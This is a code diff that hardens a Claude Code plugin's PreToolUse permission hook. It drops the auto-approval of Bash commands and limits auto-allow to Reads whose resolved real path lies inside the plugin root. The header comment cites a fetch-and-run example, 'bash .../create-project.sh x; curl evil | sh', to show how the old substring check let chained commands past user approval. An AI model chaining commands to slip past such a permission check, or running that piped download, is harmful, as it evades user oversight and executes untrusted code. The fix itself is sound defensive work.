@@ -1,47 +1,40 @@
 #!/usr/bin/env node
 /**
- * ArcKit PermissionRequest Hook — Auto-Allow Plugin-Internal Reads & Scripts
+ * ArcKit PreToolUse Hook — Auto-Allow Reads of the Plugin's Own Files
  *
- * Reading the plugin's own bundled files (templates, schemas, scripts,
- * agent prompts, references) and invoking the plugin's own bundled
- * helper scripts (validate-handoff.mjs, create-project.sh, generate-
- * document-id.sh, etc.) should not require user approval each session.
- * They are part of the plugin the user has already trusted by enabling.
+ * Every ArcKit command reads its template, reference and schema files from
+ * the plugin's install directory, which sits outside the user's working
+ * directory, so each read would otherwise ask for approval. Claude Code has
+ * no way for a plugin to pre-approve reads of its own files (a
+ * `Read(${CLAUDE_PLUGIN_ROOT}/...)` rule in `allowed-tools` is not
+ * substituted; tested on v2.1.285), so this hook approves exactly that:
  *
- * This hook auto-approves PermissionRequests for:
- *   - Read against any path under the plugin root
- *   - Bash invocations whose command string contains a path under
- *     ${CLAUDE_PLUGIN_ROOT}/scripts/ (validate-handoff.mjs,
- *     scripts/bash/*.sh helpers)
+ *   - Read of a file whose real path (symlinks and `..` resolved) is inside
+ *     the plugin root;
+ *   - Read of an ArcKit handoff tempfile in /tmp (legacy; kept for
+ *     orchestrators on older command bodies).
  *
- * Anything else (Read of project files, Bash for arbitrary commands,
- * Write of project artefacts, etc.) falls through to the normal
- * permission dialog.
+ * It grants nothing else. It used to approve Bash commands that invoked
+ * plugin scripts, but that check looked only for the script path, so
+ * `bash .../create-project.sh x; curl evil | sh` was approved whole. Plugin
+ * scripts are now pre-approved natively by each command's `allowed-tools`
+ * Bash rules, which Claude Code checks per subcommand, and reader output is
+ * validated by hooks/validate-reader-handoff.mjs without Bash.
  *
- * Hook Type: PreToolUse
- * Input (stdin):  JSON { tool_name, tool_input: {...}, ... }
- * Output (stdout):
- *   On match (allow):
- *     {"hookSpecificOutput": {
- *       "hookEventName": "PreToolUse",
- *       "permissionDecision": "allow",
- *       "permissionDecisionReason": "..."
- *     }}
- *   On no-match: silent pass-through (exit 0, no JSON).
- *
- * Exit code 0 always — pass-through is a non-decision, not a failure.
- * Hook auto-allow does NOT override user/project deny rules: per the
- * Claude Code docs, deny rules take precedence over plugin hook allows.
+ * Hook Type: PreToolUse (matcher Read)
+ * Output on match: {"hookSpecificOutput": {"hookEventName": "PreToolUse",
+ *   "permissionDecision": "allow", "permissionDecisionReason": "..."}}
+ * No match: silent pass-through. Exit code 0 always. User and project deny
+ * rules still take precedence over a hook allow.
  */
 
-import { readFileSync } from 'node:fs';
+import { readFileSync, realpathSync } from 'node:fs';
 import { fileURLToPath } from 'node:url';
 import { dirname, resolve } from 'node:path';
 
 // Plugin root = parent of the hooks/ dir this script lives in.
 const __dirname = dirname(fileURLToPath(import.meta.url));
 const PLUGIN_ROOT = resolve(__dirname, '..');
-const SCRIPTS_DIR = resolve(PLUGIN_ROOT, 'scripts');
 
 main();
 
@@ -74,13 +67,6 @@ function main() {
     }
   }
 
-  if (toolName === 'Bash') {
-    const command = input.command || '';
-    if (commandTouchesPluginScripts(command)) {
-      allow('ArcKit: auto-allowed Bash invocation of plugin-internal helper script');
-    }
-  }
-
   // No match — silent pass-through. Claude Code falls back to the
   // normal permission flow (user prompt, deny rules, etc.).
   process.exit(0);
@@ -90,61 +76,17 @@ function main() {
 
 function isUnderPluginRoot(p) {
   if (!p || typeof p !== 'string') return false;
-  // Resolve to absolute, then check prefix. Don't follow symlinks; the
-  // plugin's distributed files are real files in a marketplace cache.
-  const abs = resolve(p).replaceAll('\\', '/');
-  const root = PLUGIN_ROOT.replaceAll('\\', '/');
-  return abs === root || abs.startsWith(root + '/');
-}
-
-function commandTouchesPluginScripts(cmd) {
-  if (!cmd || typeof cmd !== 'string') return false;
-  // Two trust markers — either form qualifies:
-  //   1. Resolved absolute path: /.../arckit-claude/scripts/...
-  //   2. Env-var literal: ${CLAUDE_PLUGIN_ROOT}/scripts/... — Claude
-  //      Code passes the LLM-emitted command to the hook with the env
-  //      var unexpanded; bash expands at execution time.
-  // An attacker-forged command can't fabricate the real plugin path,
-  // and ${CLAUDE_PLUGIN_ROOT} is a sentinel string the LLM only emits
-  // when the prompt instructed it to use plugin-internal helpers.
-  const PREFIXES = [
-    SCRIPTS_DIR.replaceAll('\\', '/') + '/',
-    '${CLAUDE_PLUGIN_ROOT}/scripts/',
-  ];
-  let anyPrefixHit = false;
-  for (const p of PREFIXES) if (cmd.includes(p)) { anyPrefixHit = true; break; }
-  if (!anyPrefixHit) return false;
-
-  const KNOWN = new Set([
-    'validate-handoff.mjs',
-    'generate-document-id.mjs',
-    'bash/common.sh',
-    'bash/create-project.sh',
-    'bash/generate-document-id.sh',
-    'bash/check-prerequisites.sh',
-    'bash/list-projects.sh',
-    'bash/migrate-filenames.sh',
-    'bash/detect-stale-artifacts.sh',
-  ]);
-
-  // Collect every "scripts/<filename>" reference in the command string,
-  // regardless of which prefix introduces it. If any reference points
-  // to a filename NOT in the allowlist, refuse to auto-allow.
-  const refs = [];
-  for (const prefix of PREFIXES) {
-    const re = new RegExp(escapeRegex(prefix) + '([A-Za-z0-9_./-]+)', 'g');
-    const matches = [...cmd.matchAll(re)];
-    for (const m of matches) refs.push(m[1]);
+  // Resolve `..` and follow symlinks on both sides, so neither a traversal
+  // nor a symlink inside the plugin can reach a file outside it. A path that
+  // doesn't exist can't be read anyway; don't approve it.
+  let real, root;
+  try {
+    real = realpathSync(resolve(p)).replaceAll('\\', '/');
+    root = realpathSync(PLUGIN_ROOT).replaceAll('\\', '/');
+  } catch {
+    return false;
   }
-  if (refs.length === 0) return false;
-  for (const tail of refs) {
-    if (!KNOWN.has(tail)) return false;
-  }
-  return true;
-}
-
-function escapeRegex(s) {
-  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+  return real === root || real.startsWith(root + '/');
 }
 
 function isArcKitTempfile(p) {
